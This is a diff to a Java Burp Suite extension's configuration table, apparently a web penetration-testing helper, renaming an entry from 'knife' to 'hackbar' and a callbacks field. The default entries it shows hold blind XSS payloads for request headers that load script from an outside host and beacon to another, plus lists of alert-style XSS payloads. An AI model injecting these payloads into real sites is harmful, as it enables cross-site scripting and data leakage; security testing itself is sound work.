@@ -36,7 +36,7 @@ public class ConfigTableModel extends AbstractTableModel{
 
         configEntries.add(new ConfigEntry("X-Forwarded-For", "'\\\"/><script src=https://bmw.xss.ht></script>",ConfigEntry.Action_Add_Or_Replace_Header,true));
         configEntries.add(new ConfigEntry("User-Agent", "'\\\"/><script src=https://bmw.xss.ht></script><img/src=bit.0y0.link/%host>",ConfigEntry.Action_Append_To_header_value,true));
-        configEntries.add(new ConfigEntry("knife", "'\\\"/><script src=https://bmw.xss.ht></script><img/src=bit.0y0.link/%host>",ConfigEntry.Action_Add_Or_Replace_Header,true));
+        configEntries.add(new ConfigEntry("hackbar", "'\\\"/><script src=https://bmw.xss.ht></script><img/src=bit.0y0.link/%host>",ConfigEntry.Action_Add_Or_Replace_Header,true));
 
         configEntries.add(new ConfigEntry("basic", "<script>alert('XSS')</script>, <scr<script>ipt>alert('XSS')</scr<script>ipt>, \"><script>alert('XSS')</script>, \"><script>alert(String.fromCharCode(88,83,83))</script>",ConfigEntry.Config_Xss_Payload,true));
         configEntries.add(new ConfigEntry("img", "<img src=x onerror=alert('XSS');>, <img src=x onerror=alert('XSS')//, <img src=x onerror=alert(String.fromCharCode(88,83,83));>, <img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>, <img src=x:alert(alt) onerror=eval(src) alt=xss>, \"><img src=x onerror=alert('XSS');>, \"><img src=x onerror=alert(String.fromCharCode(88,83,83));>",ConfigEntry.Config_Xss_Payload,true));
@@ -281,7 +281,7 @@ public class ConfigTableModel extends AbstractTableModel{
     //////////////////////extend AbstractTableModel////////////////////////////////
 
     public void addNewConfigEntry(ConfigEntry lineEntry){
-        PrintWriter stdout = new PrintWriter(BurpExtender.callbacks.getStdout(), true);
+        PrintWriter stdout = new PrintWriter(BurpExtender.mCallbacks.getStdout(), true);
         synchronized (configEntries) {
             configEntries.add(lineEntry);
             int row = configEntries.size();
@@ -294,7 +294,7 @@ public class ConfigTableModel extends AbstractTableModel{
     }
 
     public void removeRows(int[] rows) {
-        PrintWriter stdout1 = new PrintWriter(BurpExtender.callbacks.getStdout(), true);
+        PrintWriter stdout1 = new PrintWriter(BurpExtender.mCallbacks.getStdout(), true);
         synchronized (configEntries) {
             //because thread let the delete action not in order, so we must loop in here.
             //list length and index changed after every remove.the origin index not point to right item any more.
